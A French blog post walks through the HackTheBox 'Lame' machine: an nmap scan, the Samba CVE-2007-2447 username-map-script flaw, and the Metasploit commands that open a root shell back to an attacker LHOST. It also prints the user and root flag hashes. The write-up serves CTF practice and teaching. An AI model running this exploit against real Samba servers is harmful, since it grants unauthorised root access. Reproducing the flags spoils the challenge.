---
layout: post
title: "HackTheBox - Lame"
date: 2025-12-15 10:00:00 +0100
author: Howl
categories: [ctf]
tags: [linux, samba, cve-2007-2447, metasploit, easy]
platform: hackthebox
difficulty: easy
excerpt: "Machine Linux classique exploitant une vulnérabilité Samba (CVE-2007-2447). Un excellent point de départ pour les débutants sur HackTheBox."
---

## Informations

| Champ       | Valeur              |
|-------------|---------------------|
| Plateforme  | HackTheBox          |
| OS          | Linux               |
| Difficulté  | Easy                |
| IP          | 10.10.10.3          |
| Date        | 14 Mars 2017        |

---

## Reconnaissance

On commence par un scan Nmap pour identifier les services exposés :

```bash
nmap -sC -sV -oN lame.nmap 10.10.10.3
```

Résultats pertinents :

```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

Le service **Samba 3.0.20** est particulièrement intéressant — cette version est connue pour être vulnérable.

---

## Exploitation

### CVE-2007-2447 — Samba Username Map Script

La vulnérabilité se trouve dans le paramètre `username map script` de Samba. Elle permet l'exécution de commandes arbitraires via une injection dans le nom d'utilisateur lors de l'authentification.

**Avec Metasploit :**

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
```

On obtient directement un shell **root** !

---

## Flags

### User flag

```bash
cat /home/makis/user.txt
# 69454a937d94f5f0225ea00acd2e84c5
```

### Root flag

```bash
cat /root/root.txt
# 92caac3be140ef409e45721348a4e9df
```

---

## Conclusion

Lame est une machine idéale pour commencer sur HackTheBox. La vulnérabilité Samba permet d'obtenir directement un accès root sans escalade de privilèges. À retenir : toujours vérifier les versions des services exposés.

**Outils utilisés :** `nmap`, `metasploit`
